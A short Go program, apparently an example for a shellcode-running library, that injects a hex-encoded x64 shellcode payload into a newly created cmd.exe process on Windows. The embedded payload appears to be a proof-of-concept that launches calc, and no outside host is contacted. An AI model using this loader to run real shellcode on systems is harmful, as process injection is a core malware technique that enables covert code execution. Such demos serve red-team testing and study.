// +build windows

package main

import (
	"log"

	sc "github.com/cauefcr/go-shellcode"
)

func main() {
	err := sc.RunSCcreateProcess("505152535657556A605A6863616C6354594883EC2865488B32488B7618488B761048AD488B30488B7E3003573C8B5C17288B741F204801FE8B541F240FB72C178D5202AD813C0757696E4575EF8B741F1C4801FE8B34AE4801F799FFD74883C4305D5F5E5B5A5958C3", 2, "C:\\Windows\\System32\\cmd.exe", []string{"/c", "whoami", "/asdfasdf"})
	if err != nil {
		log.Panic(err)
	}
}

// export GOOS=windows GOARCH=amd64;go build -o goCreateProcess.exe cmd/CreateProcess/main.go
// test STDERR go run .\cmd\CreateProcess\main.go -verbose -debug -program "C:\Windows\System32\cmd.exe" -args "/c whoami /asdfasdf"
